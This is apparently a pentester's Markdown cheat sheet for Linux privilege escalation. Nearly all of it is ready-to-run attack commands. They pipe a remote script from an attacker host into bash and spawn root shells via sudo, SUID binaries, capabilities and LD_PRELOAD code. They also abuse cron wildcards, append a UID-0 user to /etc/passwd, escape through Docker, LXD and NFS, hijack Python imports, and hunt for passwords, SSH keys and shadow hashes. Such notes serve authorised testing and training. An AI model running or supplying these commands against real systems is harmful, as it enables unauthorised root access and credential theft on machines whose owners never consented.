# PrivEsc — Linux — [Back to Main](../README.md)

See [Windows PrivEsc](windows_privesc.md) for Windows. See [CVE PrivEsc](cve_privesc.md) for PwnKit, Dirty Pipe, PrintNightmare, etc.

> Always append, never overwrite: `echo 'data' | tee -a /etc/file`

## Auto Enumeration

```bash
# linPEAS — best all-in-one, colour-codes high-confidence findings
curl http://$LHOST:8000/linpeas.sh | bash
# or
wget http://$LHOST:8000/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh

# pspy — watch cron jobs and process execution without root
wget http://$LHOST:8000/pspy64 -O /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy
```

## Manual Quick Checks

```bash
# Identity + sudo
id; groups
sudo -l                               # NOPASSWD entries = immediate win

# SUID / SGID binaries → check at gtfobins.github.io
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Capabilities
getcap -r / 2>/dev/null
# cap_setuid+ep on python/perl/etc = setuid(0) → root

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l; crontab -l -u root 2>/dev/null

# Writable files / directories
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# Active network connections (find services only on localhost)
ss -tulnp

# Kernel version
uname -a; cat /etc/os-release
```

## Sudo Exploitation

```bash
sudo -l   # look for NOPASSWD or improperly restricted commands

# Any binary on GTFOBins works — common ones:
sudo find . -exec /bin/bash \; -quit
sudo vim -c '!bash'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo less /etc/passwd   # then: !/bin/bash
sudo nano /etc/passwd   # Ctrl+R Ctrl+X: reset; sh 1>&0 2>&0
sudo env /bin/bash
sudo cp /bin/bash /tmp/rootbash; sudo chmod +s /tmp/rootbash; /tmp/rootbash -p
```

**LD_PRELOAD (if `env_keep+=LD_PRELOAD` in sudo):**
```c
// priv.c
#include <stdio.h>
#include <stdlib.h>
void _init() { setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -o /tmp/priv.so /tmp/priv.c -nostartfiles
sudo LD_PRELOAD=/tmp/priv.so <allowed_command>
```

## SUID Exploitation

```bash
# Check non-standard SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep -v "snap\|/usr/bin/\|/bin/"

# Common exploitable SUID paths (check gtfobins.github.io for each)
# bash -p     (if bash is SUID)
# find . -exec /bin/bash -p \;
# python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
# perl -e 'exec "/bin/bash";'
# cp /bin/bash /tmp/b; chmod +s /tmp/b; /tmp/b -p  (if cp is SUID)
```

## Capabilities

```bash
getcap -r / 2>/dev/null

# cap_setuid+ep: can set UID to 0
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# cap_net_raw+ep: can sniff traffic
# cap_dac_read_search: can read any file
tar czf /tmp/shadow.tar.gz /etc/shadow   # read shadow with tar that has this cap
```

## Cron Job Abuse

```bash
# If a cron script is writable:
echo 'chmod +s /bin/bash' >> /etc/cron.d/writable_script.sh
# Wait for cron to run, then:
bash -p

# If cron calls a binary without full path and /tmp is in PATH:
export PATH=/tmp:$PATH
echo '/bin/bash -i' > /tmp/targetbinary
chmod +x /tmp/targetbinary

# Wildcard injection (tar, chown, chmod in cron):
# If cron runs: tar czf backup.tar.gz /home/user/*
touch /home/user/--checkpoint=1
touch '/home/user/--checkpoint-action=exec=sh shell.sh'
echo 'chmod +s /bin/bash' > /home/user/shell.sh; chmod +x /home/user/shell.sh
```

## Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt hacked hacked123   # outputs $1$hacked$...

# Append new root user (UID 0)
echo 'hacker:$1$hacked$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: hacked123
```

## NFS no_root_squash

```bash
# Check on RHOST
cat /etc/exports   # look for no_root_squash

# Exploit from LHOST (as root):
showmount -e $IP
mkdir /mnt/nfs
mount -t nfs $IP:/shared /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On RHOST:
/shared/bash -p
```

## Docker Group

```bash
id | grep docker
# If in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## LXD / LXC Group

```bash
id | grep lxd
# Import alpine image (upload lxd-alpine-builder output from LHOST):
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# Now at /mnt/root = full host filesystem
```

## Credential Hunting

```bash
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password" 2>/dev/null
grep -r "password\|passwd\|secret\|api_key" /var/www/ /home/ /opt/ 2>/dev/null | grep -v Binary
cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null   # KeePass
```

## Kernel Exploits

```bash
uname -a
searchsploit "linux kernel $(uname -r | cut -d'-' -f1) privilege escalation"
# Compile and run — verify PoC matches distro/version before running
```

> Use kernel exploits as last resort — they can crash the system.

## Python Library Hijacking

If a root-run script imports a Python library and you control the import path:

```bash
# Check: does a cron or sudo script use python?
sudo -l   # look for: sudo python3 /opt/script.py
cat /opt/script.py   # check what it imports

# Method 1: PYTHONPATH manipulation (if env_keep+=PYTHONPATH in sudo)
mkdir /tmp/hijack
# Create fake module matching the import (e.g. 'import requests' → create requests.py)
echo 'import os; os.system("chmod +s /bin/bash")' > /tmp/hijack/requests.py
sudo PYTHONPATH=/tmp/hijack python3 /opt/script.py
bash -p

# Method 2: writable site-packages or module file
# Check if any imported module is in a writable location
python3 -c "import requests; print(requests.__file__)"
ls -la /usr/lib/python3/dist-packages/requests/  # is it writable?
# If yes: prepend malicious code to __init__.py of the module
echo 'import os; os.system("chmod +s /bin/bash")' | cat - /usr/lib/python3/dist-packages/requests/__init__.py > /tmp/init.py
cp /tmp/init.py /usr/lib/python3/dist-packages/requests/__init__.py
# Wait for root to run script, then: bash -p

# Method 3: create module in same directory as the script
# Python searches CWD first (if it's in sys.path)
ls -la /opt/script.py   # can you write to /opt/?
# If yes: create /opt/requests.py with malicious payload
echo 'import os; os.system("chmod +s /bin/bash")' > /opt/requests.py
sudo python3 /opt/script.py
bash -p
```

## Restricted Shell Escape (rbash / limited shell)

```bash
# Try these in order:
bash --norc --noprofile
sh
/bin/bash
echo os.system('/bin/bash')              # Python available?
:set shell=/bin/bash; :shell             # vim
!/bin/bash                               # less, man, ftp, gdb, etc.
ssh user@localhost /bin/bash --norc      # if ssh is available
```
